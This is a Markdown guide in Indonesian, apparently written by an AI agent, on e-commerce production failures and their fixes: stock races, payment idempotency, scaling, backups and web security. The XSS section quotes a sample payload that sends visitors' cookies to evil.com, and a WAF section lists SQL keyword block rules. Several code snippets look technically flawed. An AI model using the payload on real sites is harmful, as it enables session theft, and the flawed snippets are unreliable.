# 🚨 E-commerce Disaster Roadmap & Solutions

**Dokumen ini menjelaskan 15+ skenario terburuk yang bisa terjadi di marketplace LIVE production dan solusi lengkapnya.**

---

## 📋 Daftar Isi

1. [Database & Transaction Disasters](#1-database--transaction-disasters)
2. [Traffic & Performance Disasters](#2-traffic--performance-disasters)
3. [Payment & Financial Disasters](#3-payment--financial-disasters)
4. [Security Disasters](#4-security-disasters)
5. [Operational Disasters](#5-operational-disasters)
6. [Implementation Roadmap](#implementation-roadmap)

---

# 1. Database & Transaction Disasters

## 1.1 🔴 OVERSELLING / Stok Minus

### Skenario

100 orang beli produk Flash Sale (stok 10) bersamaan. Sistem tidak lock row saat check stok.

### Dampak Bisnis

- **Finansial:** Harus refund + kompensasi customer yang kecewa
- **Reputasi:** Rating turun, review negatif
- **Legal:** Potensi gugatan konsumen

### Root Cause

```javascript
// ❌ KODE SALAH - Race Condition
const product = await prisma.product.findUnique({where: {id}});
if (product.stock >= quantity) {  // 100 request pass check ini BERSAMAAN
    await prisma.product.update({
        where: {id},
        data: {stock: {decrement: quantity}}
    });
}
```

### ✅ Solusi

```javascript
// ✅ KODE BENAR - Row-Level Locking
await prisma.$transaction(async (tx) => {
    const product = await tx.$queryRaw`
        SELECT * FROM products WHERE id = ${id}::uuid FOR UPDATE
    `;
    if (product[0].stock < quantity) {
        throw new Error('Stok habis');
    }
    await tx.product.update({where: {id}, data: {stock: {decrement: quantity}}});
});
```

### Status di Sistem Anda: ✅ SUDAH DIIMPLEMENTASI

---

## 1.2 🔴 DOUBLE PAYMENT / Pembayaran Ganda

### Skenario

User klik tombol bayar 2x cepat. Atau webhook Midtrans retry karena network timeout. Saldo user dikurangi 2x.

### Dampak Bisnis

- **Finansial:** Harus refund manual, cash flow kacau
- **Customer Trust:** User takut bayar lagi di kemudian hari

### Root Cause

Tidak ada idempotency key pada payment processing.

### ✅ Solusi

```javascript
// Webhook Handler dengan Idempotency
export async function handlePaymentWebhook(payload) {
    const existingLog = await prisma.paymentLog.findFirst({
        where: { 
            transactionId: payload.transaction_id,
            status: 'SUCCESS'
        }
    });
    
    if (existingLog) {
        console.log('Payment already processed, skipping...');
        return { duplicate: true };
    }
    
    // Process payment...
    await prisma.paymentLog.create({
        data: {
            transactionId: payload.transaction_id,
            status: 'SUCCESS',
            processedAt: new Date()
        }
    });
}
```

### Status di Sistem Anda: ✅ SUDAH DIIMPLEMENTASI (lib/webhookHandler.js)

---

## 1.3 🔴 DATABASE DOWN / Connection Pool Exhausted

### Skenario

Saat promo besar, 5000 user akses bersamaan. PostgreSQL default `max_connections=100` habis. Semua request gagal.

### Dampak Bisnis

- **Revenue Loss:** 100% downtime = 0 sales
- **Reputasi:** "Website jelek, sering error"

### Root Cause

```
DATABASE_URL="postgresql://user:pass@localhost:5432/db"  # No pool config
```

### ✅ Solusi

**Level 1: Prisma Connection Pool**

```
DATABASE_URL="postgresql://user:pass@localhost:5432/db?connection_limit=20&pool_timeout=30"
```

**Level 2: PgBouncer (Connection Pooler)**

```yaml
# docker-compose.yml
pgbouncer:
  image: edoburu/pgbouncer
  environment:
    DATABASE_URL: "postgres://user:pass@db:5432/infiya_store"
    POOL_MODE: transaction
    MAX_CLIENT_CONN: 1000
    DEFAULT_POOL_SIZE: 25
```

**Level 3: Read Replicas**

```mermaid
graph LR
    A[App] --> B[Primary DB - Write]
    A --> C[Replica 1 - Read]
    A --> D[Replica 2 - Read]
```

### Implementation Priority: 🟡 MEDIUM (implement sebelum scaling)

---

## 1.4 🔴 DEADLOCK - Database Stuck

### Skenario

Seperti yang kita alami tadi: 50 concurrent transactions saling tunggu lock → circular dependency → PostgreSQL kill semua.

### Dampak Bisnis

- Batch orders gagal saat flash sale
- User frustasi, cart abandoned

### ✅ Solusi

**Option A: Lock Ordering**
Selalu lock tables dalam urutan yang sama (alphabetically):

```javascript
// Lock inventory dulu, baru flash_sale
await tx.$queryRaw`SELECT * FROM inventory WHERE id = $1 FOR UPDATE`;
await tx.$queryRaw`SELECT * FROM flash_sale_products WHERE id = $2 FOR UPDATE`;
```

**Option B: NOWAIT + Retry**

```javascript
try {
    await tx.$queryRaw`SELECT * FROM products WHERE id = $1 FOR UPDATE NOWAIT`;
} catch (e) {
    if (e.code === '55P03') { // Lock not available
        // Retry with exponential backoff
        await sleep(100 * Math.random());
        return processOrder(orderId); // Retry
    }
}
```

**Option C: Queue System (Best for High Traffic)**

```javascript
// Gunakan BullMQ
import { Queue } from 'bullmq';
const orderQueue = new Queue('orders');

// API hanya enqueue, tidak process langsung
app.post('/api/orders', async (req, res) => {
    await orderQueue.add('create-order', req.body);
    res.json({ status: 'queued', message: 'Pesanan sedang diproses' });
});
```

### Implementation Priority: 🟡 MEDIUM

---

# 2. Traffic & Performance Disasters

## 2.1 🔴 TRAFFIC SPIKE - Server Down

### Skenario

- Influencer post produk Anda → 100x traffic dalam 10 menit
- Flash Sale viral di Twitter
- DDoS attack

### Dampak Bisnis

- 100% downtime selama spike
- Missed revenue opportunity

### ✅ Solusi

**Level 1: Horizontal Scaling (Auto-scaling)**

```yaml
# vercel.json atau AWS Auto Scaling
{
  "functions": {
    "api/**/*.js": {
      "memory": 1024,
      "maxDuration": 30
    }
  }
}
```

**Level 2: CDN + Edge Caching**

```javascript
// next.config.js
module.exports = {
  async headers() {
    return [{
      source: '/api/products/:path*',
      headers: [
        { key: 'Cache-Control', value: 's-maxage=60, stale-while-revalidate' }
      ]
    }]
  }
}
```

**Level 3: Rate Limiting**

```javascript
// middleware.js
import { Ratelimit } from '@upstash/ratelimit';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(100, '1 m'), // 100 req/min per IP
});

export async function middleware(req) {
    const ip = req.ip ?? '127.0.0.1';
    const { success } = await ratelimit.limit(ip);
    if (!success) {
        return new Response('Too Many Requests', { status: 429 });
    }
}
```

**Level 4: Queue + Workers**

```mermaid
graph LR
    A[User Request] --> B[API - Fast Response]
    B --> C[Redis Queue]
    C --> D[Worker 1]
    C --> E[Worker 2]
    C --> F[Worker 3]
    D --> G[Database]
```

### Implementation Priority: 🔴 HIGH (implement before launch)

---

## 2.2 🔴 SLOW QUERIES - N+1 Problem

### Skenario

Homepage load 10 detik karena query tidak optimal. User bounce.

### Dampak Bisnis

- Conversion rate drop 50% per 3 detik delay
- SEO ranking turun (Core Web Vitals fail)

### Root Cause

```javascript
// ❌ N+1 Query - 101 database calls!
const products = await prisma.product.findMany(); // 1 query
for (const p of products) {
    const category = await prisma.category.findUnique({where: {id: p.categoryId}}); // 100 queries
}
```

### ✅ Solusi

```javascript
// ✅ Eager Loading - 1 query
const products = await prisma.product.findMany({
    include: { category: true }
});
```

**Advanced: Query Caching**

```javascript
import { withCache } from '@/lib/cache';

export async function getProducts() {
    return withCache(
        'products:featured',
        async () => prisma.product.findMany({where: {isFeatured: true}}),
        { ttl: 300 } // 5 minutes
    );
}
```

### Status di Sistem Anda: ✅ SUDAH ADA (lib/cache.js)

---

## 2.3 🔴 MEMORY LEAK - Gradual Slowdown

### Skenario

Server makin lambat setiap hari. Restart sementara fix, tapi balik lagi.

### Root Cause

- Prisma client tidak di-disconnect
- Event listeners tidak di-cleanup
- Large objects not garbage collected

### ✅ Solusi

```javascript
// Singleton Prisma Client
// lib/prisma.js
import { PrismaClient } from '@prisma/client';

const globalForPrisma = globalThis;
export const prisma = globalForPrisma.prisma ?? new PrismaClient();

if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma;

// Graceful shutdown
process.on('SIGTERM', async () => {
    await prisma.$disconnect();
    process.exit(0);
});
```

### Status di Sistem Anda: ✅ SUDAH BENAR (lib/prisma.js)

---

# 3. Payment & Financial Disasters

## 3.1 🔴 PAYMENT GATEWAY DOWN

### Skenario

Midtrans maintenance atau down. User tidak bisa bayar. Cart abandoned.

### Dampak Bisnis

- 100% payment failure selama downtime
- Lost sales tidak bisa di-recover

### ✅ Solusi

**Multiple Payment Gateway (Fallback)**

```javascript
async function createPayment(order) {
    try {
        // Primary: Midtrans
        return await midtrans.createTransaction(order);
    } catch (e) {
        console.error('Midtrans failed, trying Xendit...');
        // Fallback: Xendit
        return await xendit.createInvoice(order);
    }
}
```

**Manual Transfer Option (Always Available)**

```javascript
// Selalu sediakan opsi transfer manual
const paymentMethods = [
    { id: 'midtrans', name: 'Kartu Kredit / E-Wallet', available: midtransStatus },
    { id: 'manual_transfer', name: 'Transfer Bank Manual', available: true } // Always on
];
```

### Implementation Priority: 🟡 MEDIUM

---

## 3.2 🔴 WRONG PRICING - Harga Salah Tampil

### Skenario

Admin typo harga Rp 1.000.000 jadi Rp 10.000. 500 orang beli. Legal obligation untuk honor?

### Dampak Bisnis

- **Finansial:** Kerugian jutaan rupiah
- **Legal:** Gray area, bisa digugat jika tidak honor

### ✅ Solusi

**Price Validation Rules**

```javascript
// Sebelum save ke DB
function validatePrice(oldPrice, newPrice) {
    const changePercent = Math.abs((newPrice - oldPrice) / oldPrice) * 100;
    
    if (changePercent > 50) {
        // Perubahan > 50% butuh approval
        throw new Error('Perubahan harga terlalu besar, butuh approval manager');
    }
    
    if (newPrice < 1000) {
        throw new Error('Harga minimum Rp 1.000');
    }
}
```

**Order Review Before Processing**

```javascript
// Jangan langsung reduce stock, beri window cancel
const order = await prisma.order.create({
    data: {
        ...orderData,
        status: 'PENDING_REVIEW', // Admin bisa cancel jika ada anomaly
        reviewDeadline: new Date(Date.now() + 15 * 60 * 1000) // 15 min
    }
});
```

**Terms & Conditions**
Tambahkan clause legal:
> "Kami berhak membatalkan pesanan jika terjadi kesalahan harga yang jelas (obvious error)."

### Implementation Priority: 🟡 MEDIUM

---

## 3.3 🔴 REFUND FRAUD - Penipuan Refund

### Skenario

Buyer claim tidak terima barang (padahal terima). Minta refund. Barang + uang hilang.

### ✅ Solusi

**Shipping Proof Required**

```javascript
// Refund hanya bisa diproses jika ada bukti
const refundRules = {
    'ITEM_NOT_RECEIVED': {
        requires: ['shipping_tracking', 'delivery_proof'],
        autoApprove: false // Manual review
    },
    'ITEM_DAMAGED': {
        requires: ['photo_evidence', 'unboxing_video'],
        autoApprove: false
    }
};
```

**Seller Protection Score**

```sql
-- Track buyer refund history
SELECT 
    buyer_id,
    COUNT(*) as total_orders,
    SUM(CASE WHEN status = 'REFUNDED' THEN 1 ELSE 0 END) as refund_count,
    refund_count / total_orders as refund_rate
FROM orders
GROUP BY buyer_id
HAVING refund_rate > 0.3; -- Flag buyers dengan refund rate > 30%
```

### Status di Sistem Anda: 🟡 PARTIAL (RefundRequest model ada, perlu logic lebih)

---

# 4. Security Disasters

## 4.1 🔴 SQL INJECTION - Database Diretas

### Skenario

Hacker inject SQL via search input. Dump seluruh database termasuk password.

### Root Cause

```javascript
// ❌ VULNERABLE
const results = await prisma.$queryRaw`
    SELECT * FROM products WHERE name LIKE '%${userInput}%'
`;
```

### ✅ Solusi

```javascript
// ✅ SAFE - Parameterized Query
import { Prisma } from '@prisma/client';

const results = await prisma.$queryRaw(
    Prisma.sql`SELECT * FROM products WHERE name ILIKE ${`%${userInput}%`}`
);
```

### Status di Sistem Anda: ✅ PRISMA ORM AMAN (parameterized by default)

---

## 4.2 🔴 XSS - Script Injection

### Skenario

Hacker submit review: `<script>document.location='http://evil.com?cookie='+document.cookie</script>`.
Setiap user yang buka product page, cookie mereka dicuri.

### ✅ Solusi

```javascript
// Sanitize semua user input
import DOMPurify from 'isomorphic-dompurify';

function sanitizeInput(input) {
    return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] }); // Strip all HTML
}

// React sudah escape by default, tapi hati-hati dengan dangerouslySetInnerHTML
// ❌ JANGAN
<div dangerouslySetInnerHTML={{__html: userContent}} />

// ✅ SAFE
<div>{userContent}</div>
```

### Status di Sistem Anda: ✅ REACT ESCAPE BY DEFAULT

---

## 4.3 🔴 CREDENTIAL LEAK - API Key Bocor

### Skenario

Developer commit `.env` ke GitHub public. Hacker pakai API key Midtrans untuk create fake payments.

### ✅ Solusi

**Git Protection**

```gitignore
# .gitignore - WAJIB
.env
.env.local
.env.production
```

**Secret Rotation**

```bash
# Jika leak terjadi, rotate semua keys immediately
# Midtrans: Dashboard > Settings > API Keys > Regenerate
# Database: ALTER USER postgres WITH PASSWORD 'new_password';
```

**Environment Separation**

```
.env.development  # Sandbox keys only
.env.production   # Production keys, tidak pernah di-share
```

### Status di Sistem Anda: ✅ .gitignore SUDAH BENAR

---

## 4.4 🔴 DDOS ATTACK - Website Down Karena Serangan

### Skenario

Kompetitor atau hacker flood website dengan jutaan request. Server overload.

### ✅ Solusi

**Cloudflare (FREE tier available)**

```
DNS: Point domain ke Cloudflare
Settings:
- Under Attack Mode: Auto-enable saat detect spike
- Rate Limiting: 100 req/10s per IP
- Bot Protection: Challenge suspicious traffic
```

**WAF (Web Application Firewall)**

```yaml
# Cloudflare WAF Rules
rules:
  - name: Block SQL Injection
    expression: (http.request.uri.query contains "UNION" or http.request.uri.query contains "SELECT")
    action: block
    
  - name: Rate limit API
    expression: (http.request.uri.path contains "/api/")
    action: rate_limit
    threshold: 100
    period: 60
```

### Implementation Priority: 🔴 HIGH (sebelum launch)

---

# 5. Operational Disasters

## 5.1 🔴 DEPLOYMENT FAILED - Production Down

### Skenario

Deploy code baru, ada bug fatal, production down.

### ✅ Solusi

**Blue-Green Deployment**

```mermaid
graph LR
    A[Load Balancer] -->|100%| B[Blue - Current v1.0]
    A -.->|0%| C[Green - New v1.1]
    
    D[After Testing] -->|Switch| E[Load Balancer]
    E -->|0%| F[Blue - v1.0]
    E -->|100%| G[Green - v1.1]
```

**Rollback Plan**

```bash
# Vercel automatic rollback
vercel rollback [deployment-url]

# Git revert
git revert HEAD
git push origin main
```

**Health Checks**

```javascript
// app/api/health/route.js
export async function GET() {
    try {
        await prisma.$queryRaw`SELECT 1`; // DB check
        return Response.json({ status: 'healthy', db: 'connected' });
    } catch (e) {
        return Response.json({ status: 'unhealthy', error: e.message }, { status: 500 });
    }
}
```

---

## 5.2 🔴 DATA LOSS - Backup Tidak Ada

### Skenario

Database corrupt atau accidentally deleted. Tidak ada backup. Semua data hilang.

### ✅ Solusi

**Automated Backups**

```yaml
# Neon.tech / Supabase / AWS RDS - sudah include auto backup

# Self-hosted PostgreSQL:
# crontab -e
0 2 * * * pg_dump -U postgres infiya_store | gzip > /backups/infiya_$(date +%Y%m%d).sql.gz
```

**Point-in-Time Recovery (PITR)**

```sql
-- Enable WAL archiving
ALTER SYSTEM SET archive_mode = on;
ALTER SYSTEM SET archive_command = 'cp %p /archive/%f';
```

**3-2-1 Backup Rule**

- 3 copies of data
- 2 different storage media
- 1 offsite (cloud)

---

## 5.3 🔴 INVENTORY MISMATCH - Stok Fisik ≠ Sistem

### Skenario

Sistem bilang stok 100, gudang cuma ada 50. Customer order, barang tidak ada.

### ✅ Solusi

**Regular Stock Audit**

```javascript
// Scheduled job: Bandingkan stok sistem vs laporan gudang
async function auditInventory() {
    const systemStock = await prisma.product.findMany({
        select: { id: true, name: true, stock: true }
    });
    
    const warehouseStock = await fetchFromWarehouseAPI(); // External WMS
    
    const discrepancies = systemStock.filter(p => 
        p.stock !== warehouseStock[p.id]
    );
    
    if (discrepancies.length > 0) {
        await sendAlertToAdmin(discrepancies);
    }
}
```

**Inventory Log (Audit Trail)**
Setiap perubahan stok harus tercatat:

- Siapa yang ubah
- Kapan
- Dari berapa ke berapa
- Alasan

### Status di Sistem Anda: ✅ SUDAH ADA (InventoryLog model)

---

# Implementation Roadmap

## Phase 1: Critical (Sebelum Launch) 🔴

| Item | Effort | Status |
|------|--------|--------|
| Row-level locking | 2 days | ✅ Done |
| Payment idempotency | 1 day | ✅ Done |
| Rate limiting | 1 day | ⬜ Todo |
| Cloudflare/WAF | 2 hours | ⬜ Todo |
| Health check endpoint | 1 hour | ⬜ Todo |
| Database backup | 1 hour | ⬜ Todo |

## Phase 2: Important (Bulan Pertama) 🟡

| Item | Effort | Status |
|------|--------|--------|
| Connection pooling (PgBouncer) | 4 hours | ⬜ Todo |
| Redis caching | 2 days | ✅ Partial |
| Error monitoring (Sentry) | 2 hours | ⬜ Todo |
| Price validation rules | 4 hours | ⬜ Todo |
| Automated tests | 1 week | ⬜ Todo |

## Phase 3: Scaling (Setelah PMF) 🟢

| Item | Effort | Status |
|------|--------|--------|
| Queue system (BullMQ) | 3 days | ⬜ Todo |
| Read replicas | 1 day | ⬜ Todo |
| CDN optimization | 4 hours | ⬜ Todo |
| Blue-green deploy | 2 days | ⬜ Todo |
| Multi-region | 1 week | ⬜ Todo |

---

# Quick Reference: Emergency Response

## 🚨 Website Down

1. Check Vercel/hosting dashboard
2. Check database connection
3. Rollback last deployment
4. Notify customers via social media

## 🚨 Payment Issues

1. Check Midtrans dashboard
2. Enable manual transfer fallback
3. Process pending orders manually
4. Communicate delay to customers

## 🚨 Security Breach

1. Rotate ALL credentials immediately
2. Enable maintenance mode
3. Audit logs untuk scope of breach
4. Notify affected users (GDPR/legal requirement)
5. Post-incident analysis

## 🚨 Data Corruption

1. DO NOT write anything to database
2. Identify last good backup
3. Restore ke staging, verify data
4. Restore to production
5. Replay logs jika ada

---

**Document Version:** 1.0  
**Last Updated:** 23 December 2024  
**Author:** AI Agent  

> 💡 **Pro Tip:** Bookmark dokumen ini. Review quarterly. Update setelah setiap incident.
